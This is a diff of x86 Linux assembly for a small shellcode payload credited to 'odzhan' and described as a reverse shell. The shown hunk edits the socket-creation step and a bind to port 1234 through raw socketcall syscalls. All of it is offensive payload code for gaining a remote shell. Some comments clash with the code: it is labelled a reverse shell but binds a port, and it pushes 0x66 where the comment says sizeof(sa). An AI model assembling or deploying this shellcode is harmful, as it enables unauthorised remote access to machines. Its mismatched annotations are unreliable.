@@ -28,34 +28,36 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 71 byte reverse shell for linux/x86
+; 78 byte reverse shell for linux/x86
 ; odzhan
 
     bits 32
 
-    ; setup sock_addr
-    xor    ebx, ebx          ; ebx=0
-    mul    ebx               ; eax=0, edx=0
+    xor    ebx, ebx
+    mul    ebx
     ; step 1, create a socket
     ; socket (AF_INET, SOCK_STREAM, IPPROTO_IP)
-    mov    al, 0x66          ; eax = sys_socketcall
-    inc    ebx               ; ebx = sys_socket
-    push   edx               ; args.protocol = IPPROTO_IP
-    push   ebx               ; args.type     = SOCK_STREAM
-    push   2                 ; args.family   = AF_INET
-    mov    ecx, esp          ; ecx=&args
+    inc    ebx               ; ebx      = SYS_SOCKET
+    mov    al, 0x66          ; eax      = SYS_socketcall
+    push   edx               ; protocol = IPPROTO_IP
+    push   ebx               ; type     = SOCK_STREAM
+    push   2                 ; family   = AF_INET
+    mov    ecx, esp          ; ecx      = &args
     int    0x80
-    
+
     xchg   eax, edi
     
     ; step 2, bind to port 1234
     ; bind (s, &sa, sizeof(sa))
     pop    ebx               ; ebx=2, sys_bind
     pop    esi               ; esi=1
-    push   0x10              ; sizeof(sa)
-    push   ebp               ; &sa
+    push   0xD2040002        ; INADDR_ANY,htons(1234),AF_INET
+    mov    ecx, esp
+    push   0x66
+    pop    eax               ; eax=sys_socketcall
+    push   eax               ; sizeof(sa)    
+    push   ecx               ; &sa
     push   edi               ; s
-    mov    al, 0x66          ; eax=sys_socketcall
     mov    ecx, esp          ; ecx=&args
     int    0x80
     
